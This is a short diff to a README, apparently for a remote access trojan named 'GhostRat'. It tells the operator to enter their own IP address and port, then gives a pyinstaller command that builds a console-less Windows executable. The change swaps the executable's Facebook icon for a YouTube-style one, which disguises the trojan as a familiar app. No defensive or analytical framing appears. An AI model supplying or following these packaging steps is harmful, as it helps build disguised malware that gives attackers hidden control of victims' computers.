@@ -73,7 +73,7 @@ Enter Your system IP address & Port Number & Save It
 
 ### Make Exicute Files For Windows 
 ```
-pyinstaller --onefile --noconsole --icon=Facebook.ico GhostRat.py
+pyinstaller --onefile --noconsole --icon=ytb.ico GhostRat.py
 
 ```
 After Processing Complete Open /Dist Folder 
